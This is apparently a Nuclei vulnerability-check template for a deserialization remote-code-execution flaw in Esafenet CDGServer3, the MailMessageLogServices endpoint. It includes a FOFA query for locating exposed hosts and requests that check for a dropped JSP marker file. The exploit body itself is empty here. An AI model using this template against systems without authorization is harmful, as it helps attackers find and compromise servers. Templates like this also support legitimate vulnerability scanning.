id: esafenet-cdgserver3-CDGXStreamDeser-MailMessageLogServices-rce
info:
  name: 亿赛通电子文档安全管理系统 MailMessageLogServices - rce
  author: leadlife
  severity: critical
  description: 亿赛通电子文档安全管理系统 MailMessageLogServices 接口远程代码执行漏洞，该漏洞发生在应用程序将外部输入（如用户提交的数据）反序列化为对象或数据结构时，由于缺乏充分的输入验证和安全措施，攻击者可以利用恶意数据来执行未经授权的代码或攻击。
  reference: 
    - 
  metadata:
    verified: true
    fofa-query: body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"
  tags: esafenet,rce

http:
  - raw:
      - |-
        POST /CDGServer3/MailMessageLogServices HTTP/1.1
        Accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
        Connection: close
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.8
        Content-Type: text/xml
        Host: {{Hostname}}

        
      
      - |+
        GET /CDGServer3/CDGXstreamDesers.jsp HTTP/1.1
        Accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
        Connection: close
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.8
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'ksjldfio8978sahdkjfsdfjha'

      - type: word
        part: header
        words:
          - 'text/html'

      - type: status
        status:
          - 200